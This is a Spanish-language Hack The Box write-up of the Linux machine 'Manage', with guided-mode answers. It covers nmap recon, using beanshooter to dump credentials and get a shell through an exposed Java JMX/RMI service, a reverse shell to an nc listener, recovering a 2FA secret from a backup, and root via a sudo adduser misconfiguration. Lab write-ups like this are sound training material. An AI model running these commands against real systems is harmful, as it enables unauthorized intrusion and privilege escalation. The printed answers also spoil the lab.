---
title: Writeup manage - Hack The Box - Resolución y Análisis
published: true
tags:
  - hackthebox
  - writeup
  - manage
  - ciberseguridad
  - pentesting
description: Writeup y resolución de la máquina manageen Hack The Box.
keywords:
  - writeup manage
  - hack the box manage
  - resolución máquina manage
  - manage hack the box
  - htb manage
---
-------
### 🔗 Accesos rápidos

- 📄 **Writeup online**: [Link](https://publish.obsidian.md/bunzopy/HTB/Facil/Linux/Manage)
- 📺 **Resolución en vivo (completa)**: [Link](https://www.youtube.com/watch?v=sGt3MYYg0xs)
- 🧠 **Explicación resumida**: 

---

#nmap #ping #easy #linux #whatweb #wappalyzer  #git #gitclone #java #beanshooter #tomcat #nc-nlvp443 #tratamientotty #mkdir #cd #cp #tar #sudo #cat #ls #sudo-l #sudo #abusobinarioadduser #gzip #tar  

-----
# Guided Mode

1)¿Cuántos puertos TCP abiertos están a la escucha en Manage?
	3

2)¿Qué servicio identifica nmap como activo en el puerto 2222?
	java-rmi

3)¿Cuál es la contraseña del usuario administrador del servidor Tomcat?
	fhErvo2r9wuTEYiYgt

4)¿Qué usuario ejecuta el servidor Tomcat y el servicio RMI en Manage?
	tomcat

*La pregunta anterior es la flag de user.txt*
6)¿Cuál es la ruta completa al archivo de copia de seguridad que el usuario tomcat puede leer?
	/home/useradmin/backups/backup.tar.gz

7)¿Cómo se llama el archivo que contiene los valores iniciales de la autenticación de dos factores y los códigos de respaldo?
	.google_authenticator

8)¿Cuál es la contraseña del usuario useradmin en Manage?
	onyRPCkaG4iX72BrRtKgbszd

9)¿Qué binario puede ejecutar useradmin como cualquier usuario sin contraseña?
	/usr/sbin/adduser

10)¿Qué usuario, al crearse, genera un grupo que ya está asignado como grupo privilegiado?
	admin

-----
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

Se puede utilizar la version automatizada que tenemos creada con [[startlab]] o si no de forma manual

```shell
ping -c 1 IP
nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn IP -oG allPortsTCP
extractPorts allPortsTCP
nmap -sCV -pPuertos IP -oN targetTCP
nmap -sU -n -Pn --top-ports 200 IP -oG allPortsUDP
extractPorts allPortsUDP
nmap -sU -sCV -pPuertos IP -oN targetUDP
```

El escaneo de nmap da estos errores, pero no darle importancia ya que al final nos reporta la info que necesitamos
![[Manage1.png]]
*TTL:* Maquina Linux

*Puertos TCP:*
	`22` [[ssh]]
	`2222` y `45171` java-rmi 
	`8080` HTTP Tomcat
	`35179` TCPwrapped

*Puertos UDP:*
	Nada relevante
	
![[Manage5.png]]
![[Manage4.png]]

![[Manage6.png]]


-------
# [[Whatweb-wappalyzer]]

```shell
whatweb http://10.129.234.57:8080/
```

![[Manage2.png]]

![[Manage3.png]]
Nos da que es la version 10.1.19 de tomcat

-----
# Intrusion con [[beanshooter]]

Vamos a usar [[git clone]] para descargar el repositorio con el comando `git clone https://github.com/qtc-de/beanshooter` despues nos metemos con [[cd]] a la carpeta usando `cd beenshooter` y vamos a compilar con `mvn package`

![[Manage10.png]]

Dentro de la carpeta *beanshooter-4.1.0/target* se va a crear el ejecutable asi que vamos a abrirlo y que nos enumere poniendo la ip de la maquina victima y el puerto `java -jar beanshooter-4.1.0-jar-with-dependencies.jar enum 10.129.234.57 2222`

![[Manage11.png]]

![[Manage12.png]]
Nos da estas dos credenciales

```
manager:fhErvo2r9wuTEYiYgt
admin:onyRPCkaG4iX72BrRtKgbszd
```


### Antes de ejecutar la parte de tonka 

Esto lo hice por que me aparecia un error que no tenia el  archivo tonka-bean-4.1.0-jar-with-dependencies.jar
Asi que fui a */beanshooter-4.1.0/tonka-bean/target* y ahi ejecute el comando `mvn package`

![[Manage13.png]]

Ahora esto para ejecutar el tonka y que a posteriori podamos obtener la shell `java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard 10.129.234.57 2222 tonka`
![[Manage14.png]]

Ejecutamos el comando que nos va a dar una shell `java -jar beanshooter-4.1.0-jar-with-dependencies.jar tonka shell 10.129.234.57 2222`
![[Manage15.png]]
y ahora vamos a enviarnos una [[Reverse shell]] con una bash para trabajar mas comodos mientras estamos en escucha con [[nc -nlvp 443]]

![[Manage16.png]]
![[Manage17.png]]


---
# [[Tratamiento de la TTY]]

------
# Escalada de privilegios al usuario useradmin

Vamos al home para ver los otros usuarios y entramos a la carpeta de *useradmin*. Listamos con [[ls]] los archivos y vemos que tenemos un archivos que se llama *backup.tar.gz*

![[Manage18.png]]

Vamos a ir a la carpeta tmp con con [[cd]] usando `cd tmp` para estar mas comodos, luego vamos a crear una carpeta con [[mkdir]] usamos el comando `mkdir exploit` luego entramos a la carpeta con `cd exploit` y ahora vamos a copiar el archivo con [[cp]] usando el comando `cp /home/useradmin/backups/backup.tar.gz .`

![[Manage19.png]]

Ahora descomprimimos el archivo usando [[gzip]] usando `gzip -d backup.tar.gz` y vemos que nos queda solamente un archivo *backup.tar*
![[Manage20.png]]

Descomprimimos el archivo usando [[tar]] con el comando `tar xf backup.tar` y luego vamos a ver los contenido del comprimido con `tar tf backup.tar`
![[Manage21.png]]
Como empiezan con *.* los archivos no nos van a aparecer asi que usamos [[ls]] con el comando `ls -la` y nos van a aparecer todos los archivos
Ahora con [[cat]] vamos a abrir `cat .google_authenticator`
![[Manage22.png]]

Nos vamos a meter al usuario de *useradmin* con el comando `su useradmin`, vamos a proporcionar la contraseña del usuario *admin* que teniamos de antes `onyRPCkaG4iX72BrRtKgbszd` y en el codigo de verificacion vamos a poner `99852083``que lo sacamos del archivo de autentificacion de google

---------

# Escalada de privilegios a root con [[Abuso de Sudo]] con [[Binario adduser]]

```shell
sudo -l
```
Y vemos que podemos ejecutar sin proporcionar contraseña el binario

```
(ALL : ALL) NOPASSWD: /usr/sbin/adduser
```


Usamos ``sudo /usr/sbin/adduser admin`` para agregar al usuario admin que no esta creado y con eso ya vamos a tener permisos de root
La verdad que el usuario lo saque por las preguntas del guidedmode, y fuerza bruta de ir probando
![[Manage23.png]]
![[Manage24.png]]

Ya podemos catear la flag
![[Manage25.png]]

------
# Notas

Ver como armar regex con find

La primera pregunta en hackthebox me dice que son 3 puertos nada mas abiertos, con lo cual hice pruebas con el comando que da `nmap -sC -sV` en la hint y son nada mas el 8080,22,2222

Siempre que veo archivos con . al inicial del nombre poner ls -la